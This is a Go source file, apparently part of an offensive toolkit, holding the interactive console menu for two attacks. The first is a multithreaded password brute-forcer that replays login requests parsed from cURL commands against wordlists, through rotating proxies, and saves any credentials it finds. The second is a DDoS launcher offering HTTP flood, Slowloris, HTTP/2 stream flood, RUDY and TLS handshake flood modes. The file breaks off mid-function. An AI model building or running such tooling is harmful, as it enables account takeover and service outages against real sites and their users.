package consolemenu

import (
	"bufio"
	"context"
	"fmt"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/letgo/cracker"
	"github.com/letgo/curlparser"
	"github.com/letgo/ddos"
	ddosscanner "github.com/letgo/ddos-scanner"
	"github.com/letgo/pathtraversal"
)

// attackWithCurl performs an attack using cURL configuration from a file
func (m *Menu) attackWithCurl() {
	reader := bufio.NewReader(os.Stdin)

	// Ask for cURL file path
	defaultCurlFile := filepath.Join(dataDir, "cURL-Bruteforce.txt")
	fmt.Printf("\nEnter cURL config file path (default: %s): ", defaultCurlFile)
	curlFile, _ := reader.ReadString('\n')
	curlFile = strings.TrimSpace(curlFile)
	if curlFile == "" {
		curlFile = defaultCurlFile
	}

	// Load cURL configurations from file
	curlConfigs, err := curlparser.LoadFromFile(curlFile)
	if err != nil {
		fmt.Printf("Error loading cURL config: %v\n", err)
		fmt.Println("Please make sure the file exists and contains valid cURL commands.")
		fmt.Println("\nExample cURL-Bruteforce.txt format:")
		fmt.Println("  curl -X POST https://example.com/login \\")
		fmt.Println("    -H 'Content-Type: application/json' \\")
		fmt.Println("    -d '{\"username\":\"test\",\"password\":\"test\"}'")
		fmt.Println()
		return
	}

	fmt.Printf("\n✓ Found %d cURL configuration(s)\n\n", len(curlConfigs))

	// Display found configurations
	fmt.Println("===== Found cURL Configurations =====")
	for i, config := range curlConfigs {
		fmt.Printf("[%d] %s %s\n", i+1, config.Method, config.URL)
		if config.ContentType != "" {
			fmt.Printf("    Content-Type: %s\n", config.ContentType)
		}
		if len(config.Headers) > 0 {
			fmt.Printf("    Headers: %d custom header(s)\n", len(config.Headers))
		}
		if config.Data != "" {
			// Extract field names
			usernameField, passwordField, fields := curlparser.ExtractFieldsFromData(config.Data, config.ContentType)
			fmt.Printf("    Detected fields: username='%s', password='%s'\n", usernameField, passwordField)
			if len(fields) > 2 {
				fmt.Printf("    Additional fields: %d\n", len(fields)-2)
			}
		}
		fmt.Println()
	}

	// Ask which config to use
	var selectedConfigs []*curlparser.CurlConfig
	if len(curlConfigs) == 1 {
		selectedConfigs = curlConfigs
		fmt.Println("Using the only available cURL configuration.")
	} else {
		fmt.Print("Choose option:\n")
		fmt.Print("  [1] Select specific configuration\n")
		fmt.Print("  [2] Use all configurations\n")
		fmt.Print("Enter choice (1 or 2): ")
		choice, _ := reader.ReadString('\n')
		choice = strings.TrimSpace(choice)

		if choice == "1" {
			fmt.Print("Enter configuration number: ")
			numStr, _ := reader.ReadString('\n')
			num, err := strconv.Atoi(strings.TrimSpace(numStr))
			if err != nil || num < 1 || num > len(curlConfigs) {
				fmt.Println("Invalid configuration number.")
				return
			}
			selectedConfigs = []*curlparser.CurlConfig{curlConfigs[num-1]}
		} else if choice == "2" {
			selectedConfigs = curlConfigs
		} else {
			fmt.Println("Invalid choice.")
			return
		}
	}

	// Get common attack parameters
	fmt.Println("\n===== Attack Configuration =====")

	// Ask if using proxy
	fmt.Print("Use proxy for attacks? (y/n, default: n): ")
	useProxyStr, _ := reader.ReadString('\n')
	useProxyStr = strings.TrimSpace(strings.ToLower(useProxyStr))
	useProxy := useProxyStr == "y" || useProxyStr == "yes"

	var proxyList []string
	var rotateProxy bool
	if useProxy {
		// Load proxies from proxy/proxy.txt
		proxies, err := m.loadValidProxies()
		if err != nil || len(proxies) == 0 {
			proxyPath := filepath.Join(dataDir, "proxy", "proxy.txt")
			fmt.Printf("Warning: No valid proxies found in %s (%v)\n", proxyPath, err)
			fmt.Println("Please run 'Scrape Proxies' and 'Validate Proxies' first.")
			fmt.Print("Continue without proxy? (y/n): ")
			continueStr, _ := reader.ReadString('\n')
			if strings.TrimSpace(strings.ToLower(continueStr)) != "y" {
				return
			}
			useProxy = false
		} else {
			proxyList = proxies
			fmt.Printf("✓ Loaded %d valid proxies\n", len(proxyList))

			// Ask if rotate proxies
			fmt.Print("Rotate through proxies for each request? (y/n, default: y): ")
			rotateStr, _ := reader.ReadString('\n')
			rotateStr = strings.TrimSpace(strings.ToLower(rotateStr))
			rotateProxy = rotateStr != "n" && rotateStr != "no"

			if rotateProxy {
				fmt.Println("✓ Proxy rotation enabled")
			} else {
				fmt.Printf("✓ Using single proxy: %s\n", proxyList[0])
			}
		}
	}

	// Ask if using userlist or single username
	fmt.Print("Use userlist file? (y/n, default: n): ")
	useUserlist, _ := reader.ReadString('\n')
	useUserlist = strings.TrimSpace(strings.ToLower(useUserlist))

	var username, userlist string
	if useUserlist == "y" || useUserlist == "yes" {
		defaultUserlist := filepath.Join(dataDir, "users.txt")
		fmt.Printf("Enter Userlist path (default: %s): ", defaultUserlist)
		userlist, _ = reader.ReadString('\n')
		userlist = strings.TrimSpace(userlist)
		if userlist == "" {
			userlist = defaultUserlist
		}
	} else {
		fmt.Print("Enter Username: ")
		username, _ = reader.ReadString('\n')
		username = strings.TrimSpace(username)
		if username == "" {
			fmt.Println("Error: Username is required.")
			return
		}
	}

	defaultWordlist := filepath.Join(dataDir, "passwords.txt")
	fmt.Printf("Enter Wordlist path (default: %s): ", defaultWordlist)
	wordlist, _ := reader.ReadString('\n')
	wordlist = strings.TrimSpace(wordlist)
	if wordlist == "" {
		wordlist = defaultWordlist
	}

	fmt.Print("Enter Max Threads (default: 100): ")
	threadsStr, _ := reader.ReadString('\n')
	threadsStr = strings.TrimSpace(threadsStr)
	maxThreads := 100
	if threadsStr != "" {
		if t, err := strconv.Atoi(threadsStr); err == nil && t > 0 {
			maxThreads = t
		}
	}

	// Optional: Override success/failure detection
	fmt.Print("\nEnter Success HTTP codes (comma-separated, or press Enter for auto-detect): ")
	successCodesStr, _ := reader.ReadString('\n')
	successCodesStr = strings.TrimSpace(successCodesStr)
	var successCodes []int
	if successCodesStr != "" {
		codes := strings.Split(successCodesStr, ",")
		for _, codeStr := range codes {
			if code, err := strconv.Atoi(strings.TrimSpace(codeStr)); err == nil {
				successCodes = append(successCodes, code)
			}
		}
	}

	fmt.Print("Enter Success keywords in response (comma-separated, or press Enter to skip): ")
	successKeywordsStr, _ := reader.ReadString('\n')
	successKeywordsStr = strings.TrimSpace(successKeywordsStr)
	var successKeywords []string
	if successKeywordsStr != "" {
		successKeywords = strings.Split(successKeywordsStr, ",")
		for i := range successKeywords {
			successKeywords[i] = strings.TrimSpace(successKeywords[i])
		}
	}

	fmt.Print("Enter Failure keywords in response (comma-separated, or press Enter to skip): ")
	failureKeywordsStr, _ := reader.ReadString('\n')
	failureKeywordsStr = strings.TrimSpace(failureKeywordsStr)
	var failureKeywords []string
	if failureKeywordsStr != "" {
		failureKeywords = strings.Split(failureKeywordsStr, ",")
		for i := range failureKeywords {
			failureKeywords[i] = strings.TrimSpace(failureKeywords[i])
		}
	}

	// Start attacks
	fmt.Println("\n===== Starting Attacks =====")
	successCount := 0
	totalConfigs := len(selectedConfigs)

	for i, curlConfig := range selectedConfigs {
		fmt.Printf("\n[%d/%d] Attacking: %s %s\n", i+1, totalConfigs, curlConfig.Method, curlConfig.URL)

		// Convert cURL config to attack config
		attackConfig, err := curlConfig.ToAttackConfig()
		if err != nil {
			fmt.Printf("  ✗ Error converting config: %v\n", err)
			continue
		}

		// Apply user-provided parameters
		attackConfig.Username = username
		attackConfig.Userlist = userlist
		attackConfig.Wordlist = wordlist
		attackConfig.MaxThreads = maxThreads
		attackConfig.ShowAttempts = false

		// Apply proxy settings
		attackConfig.UseProxy = useProxy
		attackConfig.ProxyList = proxyList
		attackConfig.RotateProxy = rotateProxy

		if len(successCodes) > 0 {
			attackConfig.SuccessCodes = successCodes
		}
		if len(successKeywords) > 0 {
			attackConfig.SuccessKeywords = successKeywords
		}
		if len(failureKeywords) > 0 {
			attackConfig.FailureKeywords = failureKeywords
		}

		// Display configuration details
		fmt.Printf("  → Endpoint: %s\n", attackConfig.Endpoint)
		fmt.Printf("  → Method: %s\n", attackConfig.Method)
		fmt.Printf("  → Content-Type: %s\n", attackConfig.ContentType)
		fmt.Printf("  → Username field: %s\n", attackConfig.UsernameField)
		fmt.Printf("  → Password field: %s\n", attackConfig.PasswordField)
		fmt.Printf("  → Threads: %d, Timeout: %v\n", maxThreads, attackConfig.Timeout)
		if useProxy {
			fmt.Printf("  → Proxy: Enabled (%d proxies, rotation: %v)\n", len(proxyList), rotateProxy)
		}
		if len(attackConfig.CustomHeaders) > 0 {
			fmt.Printf("  → Custom headers: %d\n", len(attackConfig.CustomHeaders))
		}

		// Create password cracker
		pc := cracker.New(*attackConfig)

		// Load userlist
		if err := pc.LoadUserlist(); err != nil {
			fmt.Printf("  ✗ Error loading userlist: %v\n", err)
			continue
		}

		// Load wordlist
		if err := pc.LoadWordlist(); err != nil {
			fmt.Printf("  ✗ Error loading wordlist: %v\n", err)
			continue
		}

		// Calculate total combinations and warn if too large
		totalUsers := len(pc.GetUserlist())
		totalPasswords := len(pc.GetWordlist())
		totalCombinations := totalUsers * totalPasswords

		if userlist != "" {
			fmt.Printf("  → Testing %d users with %d passwords (%d total combinations)\n", totalUsers, totalPasswords, totalCombinations)
		} else {
			fmt.Printf("  → Testing 1 user with %d passwords\n", totalPasswords)
		}

		// Warn for large attacks
		if totalCombinations > 100000 {
			estimatedTime := float64(totalCombinations) / 1000.0 / 60.0 // Rough estimate at 1000/s
			fmt.Printf("  ⚠ WARNING: Large attack size! Estimated time: %.1f minutes\n", estimatedTime)
			fmt.Print("  Continue? (y/n): ")
			confirm, _ := reader.ReadString('\n')
			if strings.TrimSpace(strings.ToLower(confirm)) != "y" {
				fmt.Println("  Attack cancelled.")
				continue
			}
		}

		// Start attack
		found, credentials := pc.Start()

		if found {
			fmt.Printf("  ✓ Credentials found: %s\n", credentials)
			// Parse username:password
			parts := strings.SplitN(credentials, ":", 2)
			foundUsername := username
			foundPassword := credentials
			if len(parts) == 2 {
				foundUsername = parts[0]
				foundPassword = parts[1]
			}
			// Write result to file
			if err := m.writeResult(curlConfig.URL, foundUsername, foundPassword); err != nil {
				fmt.Printf("  ⚠ Warning: Failed to write result to file: %v\n", err)
			} else {
				resultsPath := filepath.Join(dataDir, "results.txt")
				fmt.Printf("  ✓ Result saved to %s\n", resultsPath)
			}
			successCount++
		} else {
			fmt.Printf("  ✗ Password not found.\n")
		}
	}

	// Summary
	fmt.Println("\n===== Attack Summary =====")
	fmt.Printf("Total configurations attacked: %d\n", totalConfigs)
	fmt.Printf("Successful credentials found: %d\n", successCount)
	if successCount > 0 {
		resultsPath := filepath.Join(dataDir, "results.txt")
		fmt.Printf("Results saved to %s\n", resultsPath)
	}
	fmt.Println()
}

// ddosAttack performs a DDoS attack using cURL configuration from a file
func (m *Menu) ddosAttack() {
	reader := bufio.NewReader(os.Stdin)

	// Ask user to choose between template and manual config
	fmt.Println("\n" + strings.Repeat("=", 70))
	fmt.Println("                    DDoS ATTACK SETUP")
	fmt.Println(strings.Repeat("=", 70))
	fmt.Println("\nChoose configuration method:")
	fmt.Println("  [1] Use a Template       - Load attack configuration from template")
	fmt.Println("  [2] Manual Configuration - Configure attack manually")
	fmt.Print("Enter choice (1 or 2): ")
	configChoice, _ := reader.ReadString('\n')
	configChoice = strings.TrimSpace(configChoice)

	var selectedConfigs []*ddos.DDoSConfig
	var templateConfig *ddos.DDoSConfig

	if configChoice == "1" {
		// Template mode
		templates, err := ddos.ListAvailableTemplates()
		if err != nil || len(templates) == 0 {
			templatesDir := filepath.Join(dataDir, "ddos-templates")
			fmt.Printf("\nNo templates available in %s folder.\n", templatesDir)
			fmt.Println("Please create templates first or use manual configuration.")
			return
		}

		// Display available templates
		fmt.Println("\n===== Available Templates =====")
		for i, template := range templates {
			fmt.Printf("[%d] %s\n", i+1, template)
		}
		fmt.Print("\nSelect a template (number): ")
		templateChoice, _ := reader.ReadString('\n')
		templateNum, err := strconv.Atoi(strings.TrimSpace(templateChoice))
		if err != nil || templateNum < 1 || templateNum > len(templates) {
			fmt.Println("Invalid template selection.")
			return
		}

		templatePath := filepath.Join(dataDir, "ddos-templates", templates[templateNum-1])
		var loadErr error
		templateConfig, loadErr = ddos.LoadTemplateFile(templatePath)
		if loadErr != nil {
			fmt.Printf("Error loading template: %v\n", loadErr)
			return
		}

		fmt.Printf("\n✓ Loaded template: %s\n", templates[templateNum-1])
		fmt.Printf("✓ Attack Mode: %s\n", templateConfig.AttackMode)
	}

	// List available site folders
	fmt.Println("\n===== Available Site Folders =====")
	folders, err := ddosscanner.ListDDOSTargetFolders()
	if err != nil {
		fmt.Printf("Warning: Could not list folders: %v\n", err)
		folders = []string{}
	}

	// Check if cURL-DDOS.txt exists in data folder
	defaultFile := filepath.Join(dataDir, "ddos-targets", "cURL-DDOS.txt")
	hasDefaultFile := false
	if _, err := os.Stat(defaultFile); err == nil {
		hasDefaultFile = true
	}

	var selectedFolder string
	var curlFile string

	if len(folders) == 0 && !hasDefaultFile {
		ddosTargetsDir := filepath.Join(dataDir, "ddos-targets")
		fmt.Printf("No site folders or target files found in %s folder.\n", ddosTargetsDir)
		fmt.Println("Please run 'Scan Target for DDoS cURLs' first or create target files manually.")
		fmt.Print("\nEnter cURL-DDOS config file path (or press Enter to cancel): ")
		curlFileInput, _ := reader.ReadString('\n')
		curlFile = strings.TrimSpace(curlFileInput)
		if curlFile == "" {
			return
		}
	} else {
		// Display folder selection with cURL-DDOS.txt as first option if it exists (only in manual config mode)
		fmt.Println("Select a site folder:")
		optionNum := 1

		// Only show cURL-DDOS.txt option in manual configuration mode
		showDefaultFile := configChoice == "2" && hasDefaultFile
		if showDefaultFile {
			fmt.Printf("  [%d] cURL-DDOS.txt (default)\n", optionNum)
			optionNum++
		}

		for _, folder := range folders {
			fmt.Printf("  [%d] %s\n", optionNum, folder)
			optionNum++
		}

		fmt.Print("\nEnter folder number (or press Enter for default): ")
		folderChoice, _ := reader.ReadString('\n')
		folderChoice = strings.TrimSpace(folderChoice)

		if folderChoice == "" {
			// Use default (cURL-DDOS.txt) if available in manual mode, otherwise first folder
			if showDefaultFile {
				selectedFolder = "" // Root folder for default file
			} else if len(folders) > 0 {
				selectedFolder = folders[0]
			} else {
				fmt.Println("Error: No valid folders available.")
				return
			}
		} else {
			folderNum, err := strconv.Atoi(folderChoice)
			if err != nil || folderNum < 1 {
				// Invalid input, use default
				if showDefaultFile {
					selectedFolder = ""
				} else if len(folders) > 0 {
					fmt.Printf("Invalid folder number. Using first folder: %s\n", folders[0])
					selectedFolder = folders[0]
				} else {
					fmt.Println("Error: No valid folders available.")
					return
				}
			} else {
				// Calculate which option was selected
				if showDefaultFile {
					if folderNum == 1 {
						selectedFolder = "" // Root folder for default file
					} else if folderNum <= len(folders)+1 {
						selectedFolder = folders[folderNum-2] // Adjust for default file option
					} else {
						fmt.Printf("Invalid folder number. Using default: cURL-DDOS.txt\n")
						selectedFolder = ""
					}
				} else {
					if folderNum <= len(folders) {
						selectedFolder = folders[folderNum-1]
					} else {
						fmt.Printf("Invalid folder number. Using first folder: %s\n", folders[0])
						selectedFolder = folders[0]
					}
				}
			}
		}

		// Now handle file selection based on mode
		if configChoice == "1" && templateConfig != nil {
			// Template mode: auto-match files
			if selectedFolder != "" {
				folderPath := filepath.Join(dataDir, "ddos-targets", selectedFolder)
				matchingFiles, err := ddosscanner.GetFilesMatchingTemplate(folderPath, string(templateConfig.AttackMode))
				if err != nil {
					fmt.Printf("Error reading folder: %v\n", err)
					return
				}

				if len(matchingFiles) == 0 {
					fmt.Printf("\n⚠ No files matching template attack mode '%s' found in folder '%s'.\n", templateConfig.AttackMode, selectedFolder)
					fmt.Println("Please select another folder or use manual configuration.")
					return
				} else if len(matchingFiles) == 1 {
					curlFile = matchingFiles[0]
					fmt.Printf("\n✓ Auto-selected matching file: %s\n", filepath.Base(curlFile))
				} else {
					// Multiple matches, let user select
					fmt.Printf("\n===== Multiple Matching Files (Attack Mode: %s) =====", templateConfig.AttackMode)
					fmt.Println("\nSelect a file:")
					for i, file := range matchingFiles {
						fmt.Printf("  [%d] %s\n", i+1, filepath.Base(file))
					}
					fmt.Print("\nEnter file number: ")
					fileChoice, _ := reader.ReadString('\n')
					fileChoice = strings.TrimSpace(fileChoice)
					fileNum, err := strconv.Atoi(fileChoice)
					if err != nil || fileNum < 1 || fileNum > len(matchingFiles) {
						fmt.Printf("Invalid file number. Using first file: %s\n", filepath.Base(matchingFiles[0]))
						curlFile = matchingFiles[0]
					} else {
						curlFile = matchingFiles[fileNum-1]
					}
					fmt.Printf("✓ Selected: %s\n", filepath.Base(curlFile))
				}
			} else {
				// Root folder - check for matching files (template mode doesn't use default file)
				// In template mode, cURL-DDOS.txt is not available, so only check for matching files
				folderPath := filepath.Join(dataDir, "ddos-targets")
				matchingFiles, err := ddosscanner.GetFilesMatchingTemplate(folderPath, string(templateConfig.AttackMode))
				if err != nil {
					fmt.Printf("Error reading folder: %v\n", err)
					return
				}

				if len(matchingFiles) == 0 {
					fmt.Printf("\n⚠ No files matching template attack mode '%s' found in root folder.\n", templateConfig.AttackMode)
					fmt.Println("Please select another folder or use manual configuration.")
					return
				} else if len(matchingFiles) == 1 {
					curlFile = matchingFiles[0]
					fmt.Printf("\n✓ Auto-selected matching file: %s\n", filepath.Base(curlFile))
				} else {
					// Multiple matches, let user select
					fmt.Printf("\n===== Multiple Matching Files (Attack Mode: %s) =====", templateConfig.AttackMode)
					fmt.Println("\nSelect a file:")
					for i, file := range matchingFiles {
						fmt.Printf("  [%d] %s\n", i+1, filepath.Base(file))
					}
					fmt.Print("\nEnter file number: ")
					fileChoice, _ := reader.ReadString('\n')
					fileChoice = strings.TrimSpace(fileChoice)
					fileNum, err := strconv.Atoi(fileChoice)
					if err != nil || fileNum < 1 || fileNum > len(matchingFiles) {
						fmt.Printf("Invalid file number. Using first file: %s\n", filepath.Base(matchingFiles[0]))
						curlFile = matchingFiles[0]
					} else {
						curlFile = matchingFiles[fileNum-1]
					}
					fmt.Printf("✓ Selected: %s\n", filepath.Base(curlFile))
				}
			}
		} else {
			// Manual configuration mode: show all files in selected folder
			var targetFiles []string
			if selectedFolder != "" {
				targetFiles, err = ddosscanner.ListDDOSTargetFilesInFolder(selectedFolder)
				if err != nil {
					fmt.Printf("Error reading folder: %v\n", err)
					return
				}
			} else {
				// Root folder - use default file if available, otherwise list all flat files
				if hasDefaultFile {
					targetFiles = []string{defaultFile}
				} else {
					flatFiles, _ := ddosscanner.ListDDOSTargetFiles()
					targetFiles = flatFiles
				}
			}

			if len(targetFiles) == 0 {
				fmt.Printf("No target files found in folder '%s'.\n", selectedFolder)
				fmt.Println("Please run 'Scan Target for DDoS cURLs' first or create target files manually.")
				return
			}

			// Check for default file
			defaultFile := filepath.Join(dataDir, "ddos-targets", "cURL-DDOS.txt")
			hasDefault := false
			for _, file := range targetFiles {
				if file == defaultFile {
					hasDefault = true
					break
				}
			}

			// Skip file selection menu if user already selected option [1] cURL-DDOS.txt (default)
			// This happens when selectedFolder is empty (root) and only the default file exists
			if selectedFolder == "" && hasDefaultFile && len(targetFiles) == 1 && targetFiles[0] == defaultFile {
				curlFile = defaultFile
				fmt.Printf("✓ Using default file: %s\n", filepath.Base(curlFile))
			} else {
				fmt.Println("\n===== Available Target Files =====")
				fmt.Println("Select a target file:")
				for i, file := range targetFiles {
					fileName := filepath.Base(file)
					marker := ""
					if file == defaultFile {
						marker = " (default)"
					}
					fmt.Printf("  [%d] %s%s\n", i+1, fileName, marker)
				}
				fmt.Print("\nEnter file number (or press Enter for default): ")
				fileChoice, _ := reader.ReadString('\n')
				fileChoice = strings.TrimSpace(fileChoice)

				if fileChoice == "" {
					// Use default if available, otherwise first file
					if hasDefault {
						curlFile = defaultFile
					} else {
						curlFile = targetFiles[0]
					}
				} else {
					fileNum, err := strconv.Atoi(fileChoice)
					if err != nil || fileNum < 1 || fileNum > len(targetFiles) {
						fmt.Printf("Invalid file number. Using default: %s\n", defaultFile)
						if hasDefault {
							curlFile = defaultFile
						} else if len(targetFiles) > 0 {
							curlFile = targetFiles[0]
						} else {
							fmt.Println("Error: No valid target files available.")
							return
						}
					} else {
						curlFile = targetFiles[fileNum-1]
					}
				}
				fmt.Printf("✓ Selected: %s\n", filepath.Base(curlFile))
			}
		}
	}

	// Load cURL configurations from file
	ddosConfigs, err := curlparser.LoadDDoSFromFile(curlFile)
	if err != nil {
		fmt.Printf("Error loading cURL config: %v\n", err)
		fmt.Println("Please make sure the file exists and contains valid cURL commands.")
		fmt.Println("\nExample cURL-DDOS.txt format:")
		fmt.Println("  curl -X GET https://example.com/api/endpoint")
		fmt.Println("  curl -X POST https://example.com/api/data \\")
		fmt.Println("    -H 'Content-Type: application/json' \\")
		fmt.Println("    -d '{\"key\":\"value\"}'")
		fmt.Println()
		return
	}

	fmt.Printf("\n✓ Found %d target(s)\n\n", len(ddosConfigs))

	// Display found configurations
	fmt.Println("===== Target URLs =====")
	for i, config := range ddosConfigs {
		fmt.Printf("[%d] %s %s\n", i+1, config.Method, config.TargetURL)
		if config.ContentType != "" {
			fmt.Printf("    Content-Type: %s\n", config.ContentType)
		}
		if len(config.Headers) > 0 {
			fmt.Printf("    Custom Headers: %d\n", len(config.Headers))
		}
	}
	fmt.Println()

	// Ask which config to use
	if len(ddosConfigs) == 1 {
		selectedConfigs = ddosConfigs
		fmt.Println("Using the only available target.")
	} else {
		fmt.Print("Choose option:\n")
		fmt.Print("  [1] Select specific target\n")
		fmt.Print("  [2] Attack all targets simultaneously\n")
		fmt.Print("Enter choice (1 or 2): ")
		choice, _ := reader.ReadString('\n')
		choice = strings.TrimSpace(choice)

		if choice == "1" {
			fmt.Print("Enter target number: ")
			numStr, _ := reader.ReadString('\n')
			num, err := strconv.Atoi(strings.TrimSpace(numStr))
			if err != nil || num < 1 || num > len(ddosConfigs) {
				fmt.Println("Invalid target number.")
				return
			}
			selectedConfigs = []*ddos.DDoSConfig{ddosConfigs[num-1]}
		} else if choice == "2" {
			selectedConfigs = ddosConfigs
		} else {
			fmt.Println("Invalid choice.")
			return
		}
	}

	// If template mode, apply template to selected configs
	if configChoice == "1" && templateConfig != nil {
		fmt.Println("\n✓ Applying template configuration to selected targets...")

		// Load validated proxies once for this run if the template enables proxy usage.
		var validatedProxies []string
		if templateConfig.UseProxy {
			proxies, err := m.loadValidProxies()
			if err != nil || len(proxies) == 0 {
				proxyPath := filepath.Join(dataDir, "proxy", "proxy.txt")
				fmt.Printf("Warning: Template has UseProxy=true but no valid proxies found in %s (%v)\n", proxyPath, err)
				fmt.Println("Please run 'Scrape Proxies' and 'Validate Proxies' first.")
				fmt.Print("Continue without proxy? (y/n): ")
				continueStr, _ := reader.ReadString('\n')
				if strings.TrimSpace(strings.ToLower(continueStr)) != "y" {
					return
				}
				// If user chooses to continue, disable proxy usage for this run.
				templateConfig.UseProxy = false
			} else {
				validatedProxies = proxies
				fmt.Printf("✓ Loaded %d validated proxy/proxies from proxy.txt\n", len(validatedProxies))
			}
		}

		for _, config := range selectedConfigs {
			// Apply template settings, preserving cURL-derived fields
			config.AttackMode = templateConfig.AttackMode
			config.MaxThreads = templateConfig.MaxThreads
			config.Duration = templateConfig.Duration
			config.Timeout = templateConfig.Timeout
			config.RateLimit = templateConfig.RateLimit
			config.FollowRedirects = templateConfig.FollowRedirects
			config.ReuseConnections = templateConfig.ReuseConnections

			// Proxy configuration: always source from validated proxy list when enabled.
			if templateConfig.UseProxy && len(validatedProxies) > 0 {
				config.UseProxy = true
				config.ProxyList = validatedProxies
				config.RotateProxy = templateConfig.RotateProxy
			} else {
				config.UseProxy = false
				config.ProxyList = nil
				config.RotateProxy = false
			}

			config.UseCustomUserAgents = templateConfig.UseCustomUserAgents
			config.UserAgentFilePath = templateConfig.UserAgentFilePath
			// TLS settings: deprecated flags are ignored when using ModeTLSHandshakeFlood
			if config.AttackMode == ddos.ModeTLSHandshakeFlood {
				config.UseTLSAttack = false
				config.TLSHandshakeFlood = false
			} else {
				config.UseTLSAttack = templateConfig.UseTLSAttack
				config.TLSHandshakeFlood = templateConfig.TLSHandshakeFlood
			}
			config.ForceTLS = templateConfig.ForceTLS
			config.TLSRenegotiation = templateConfig.TLSRenegotiation
			config.TLSMinVersion = templateConfig.TLSMinVersion
			config.TLSMaxVersion = templateConfig.TLSMaxVersion
			config.TLSCipherSuites = templateConfig.TLSCipherSuites
			config.UseHTTP2 = templateConfig.UseHTTP2
			config.UsePipelining = templateConfig.UsePipelining
			config.AdaptiveRateLimit = templateConfig.AdaptiveRateLimit
			config.MaxStreamsPerConn = templateConfig.MaxStreamsPerConn
			config.SlowlorisDelay = templateConfig.SlowlorisDelay
			config.RUDYDelay = templateConfig.RUDYDelay
			config.RUDYBodySize = templateConfig.RUDYBodySize
		}

	} else {
		// Manual configuration mode
		fmt.Println("\n===== DDoS Configuration =====")

		// Ask if using proxy
		fmt.Print("\nUse proxy for attacks? (y/n, default: y): ")
		useProxyStr, _ := reader.ReadString('\n')
		useProxyStr = strings.TrimSpace(strings.ToLower(useProxyStr))
		useProxy := useProxyStr != "n" && useProxyStr != "no"

		var proxyList []string
		var rotateProxy bool
		if useProxy {
			// Load proxies from proxy/proxy.txt
			proxies, err := m.loadValidProxies()
			if err != nil || len(proxies) == 0 {
				proxyPath := filepath.Join(dataDir, "proxy", "proxy.txt")
				fmt.Printf("Warning: No valid proxies found in %s (%v)\n", proxyPath, err)
				fmt.Println("Please run 'Scrape Proxies' and 'Validate Proxies' first.")
				fmt.Print("Continue without proxy? (y/n): ")
				continueStr, _ := reader.ReadString('\n')
				if strings.TrimSpace(strings.ToLower(continueStr)) != "y" {
					return
				}
				useProxy = false
			} else {
				proxyList = proxies
				fmt.Printf("✓ Loaded %d valid proxies\n", len(proxyList))

				// Ask if rotate proxies
				fmt.Print("Rotate through proxies for each request? (y/n, default: y): ")
				rotateStr, _ := reader.ReadString('\n')
				rotateStr = strings.TrimSpace(strings.ToLower(rotateStr))
				rotateProxy = rotateStr != "n" && rotateStr != "no"

				if rotateProxy {
					fmt.Println("✓ Proxy rotation enabled")
				} else {
					fmt.Printf("✓ Using single proxy: %s\n", proxyList[0])
				}
			}
		}

		// Attack Mode
		fmt.Println("\nSelect Attack Mode:")
		fmt.Println("  [1] HTTP Flood          - Maximum concurrent HTTP requests (Default)")
		fmt.Println("  [2] Slowloris           - Hold connections open with partial headers")
		fmt.Println("  [3] Mixed               - Combination of flood (70%) and slowloris (30%)")
		fmt.Println("  [4] HTTP/2 Stream Flood - Flood with HTTP/2 streams (HTTPS only)")
		fmt.Println("  [5] RUDY                - Slow HTTP POST attack (R-U-Dead-Yet)")
		fmt.Println("  [6] TLS Handshake Flood - Initiate many TLS handshakes without HTTP requests")
		fmt.Print("Enter choice (1-6, default: 1): ")
		modeChoice, _ := reader.ReadString('\n')
		modeChoice = strings.TrimSpace(modeChoice)

		var attackMode ddos.AttackMode
		switch modeChoice {
		case "2":
			attackMode = ddos.ModeSlowloris
			fmt.Println("✓ Slowloris mode selected")
		case "3":
			attackMode = ddos.ModeMixed
			fmt.Println("✓ Mixed mode selected (70% flood, 30% slowloris)")
		case "4":
			attackMode = ddos.ModeHTTP2StreamFlood
			fmt.Println("✓ HTTP/2 Stream Flood mode selected")
		case "5":
			attackMode = ddos.ModeRUDY
			fmt.Println("✓ RUDY (Slow HTTP POST) mode selected")
		case "6":
			attackMode = ddos.ModeTLSHandshakeFlood
			fmt.Println("✓ TLS Handshake Flood mode selected")
		default:
			attackMode = ddos.ModeFlood
			fmt.Println("✓ HTTP Flood mode selected")
		}

		// TLS Configuration
		var forceTLS, tlsRenegotiation bool
		var tlsMinVersion, tlsMaxVersion uint16
		var tlsCipherSuites []uint16

		if attackMode == ddos.ModeTLSHandshakeFlood {
			// TLS Handshake Flood mode specific configuration
			fmt.Println("\n===== TLS Handshake Flood Configuration =====")
			fmt.Print("Force TLS on HTTP URLs? (y/n, default: n): ")
			forceTLSStr, _ := reader.ReadString('\n')
			forceTLSStr = strings.TrimSpace(strings.ToLower(forceTLSStr))
			forceTLS = forceTLSStr == "y" || forceTLSStr == "yes"
			if forceTLS {
				fmt.Println("✓ Force TLS enabled - HTTP URLs will use TLS")
			}

			// TLS Version configuration (optional)
			fmt.Print("\nConfigure TLS version? (y/n, default: n): ")
			configTLSVersionStr, _ := reader.ReadString('\n')
			configTLSVersionStr = strings.TrimSpace(strings.ToLower(configTLSVersionStr))
			if configTLSVersionStr == "y" || configTLSVersionStr == "yes" {
				fmt.Println("TLS Versions:")
				fmt.Println("  1) TLS 1.0")
				fmt.Println("  2) TLS 1.1")
				fmt.Println("  3) TLS 1.2")
				fmt.Println("  4) TLS 1.3")
				fmt.Print("Enter minimum TLS version (1-4, or Enter for default): ")
				minVerStr, _ := reader.ReadString('\n')
				minVerStr = strings.TrimSpace(minVerStr)
				if minVerStr != "" {
					if ver, err := strconv.Atoi(minVerStr); err == nil {
						switch ver {
						case 1:
							tlsMinVersion = 0x0301 // tls.VersionTLS10
						case 2:
							tlsMinVersion = 0x0302 // tls.VersionTLS11
						case 3:
							tlsMinVersion = 0x0303 // tls.VersionTLS12
						case 4:
							tlsMinVersion = 0x0304 // tls.VersionTLS13
						}
					}
				}

				fmt.Print("Enter maximum TLS version (1-4, or Enter for default): ")
				maxVerStr, _ := reader.ReadString('\n')
				maxVerStr = strings.TrimSpace(maxVerStr)
				if maxVerStr != "" {
					if ver, err := strconv.Atoi(maxVerStr); err == nil {
						switch ver {
						case 1:
							tlsMaxVersion = 0x0301 // tls.VersionTLS10
						case 2:
							tlsMaxVersion = 0x0302 // tls.VersionTLS11
						case 3:
							tlsMaxVersion = 0x0303 // tls.VersionTLS12
						case 4:
							tlsMaxVersion = 0x0304 // tls.VersionTLS13
						}
					}
				}
			}
		} else if attackMode == ddos.ModeSlowloris {
			// Slowloris mode can use TLS renegotiation
